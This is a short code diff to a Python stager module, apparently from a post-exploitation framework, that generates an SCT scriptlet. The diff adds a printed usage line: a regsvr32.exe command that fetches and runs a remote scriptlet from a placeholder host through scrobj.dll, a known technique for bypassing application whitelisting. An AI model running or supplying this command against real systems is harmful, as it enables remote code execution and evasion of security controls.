@@ -1,4 +1,5 @@
 from lib.common import helpers
+from termcolor import colored
 
 class Stager:
 
@@ -756,4 +757,6 @@ class Stager:
             code += "    <method name=\"Exec\"></method>\n"
             code += "</public>\n"
             code += "</scriptlet>\n"
+            command = """\n[+] regsvr32.exe /s /n /u /i:"http://10.10.10.10/launcher.sct" scrobj.dll"""                       
+            print colored(command, 'green', attrs=['bold'])
 	return code
